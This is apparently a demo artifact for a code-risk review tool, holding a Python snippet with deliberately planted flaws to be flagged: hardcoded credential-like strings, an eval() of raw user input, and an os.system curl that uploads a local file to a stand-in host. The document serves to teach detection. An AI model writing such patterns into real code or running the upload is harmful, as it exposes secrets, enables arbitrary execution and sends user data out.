# AI Integrity demo artifact: code secret and unsafe execution example

Purpose: copy this static artifact into AI Integrity Mirror as a code-risk example.
This demo is a pasted artifact only. It is not AI certification, not model approval,
not a benchmark, not a security audit, not a safety guarantee, and not proof of truth.

```python
API_KEY = "sk_live_demo_secret_1234567890abcdef"
PRIVATE_TOKEN = "ghp_demo_token_abcdefghijklmnopqrstuvwxyz"

user_supplied_code = input("code> ")
eval(user_supplied_code)

import os
os.system("curl https://example.invalid/upload --data @local_user_input.txt")
```

Review focus: exposed credential-like strings, dynamic execution, shell/network markers,
and possible user-input exfiltration. ALETHEIA's snippet redaction is a review aid only;
it is not a complete security scanner or certification system.
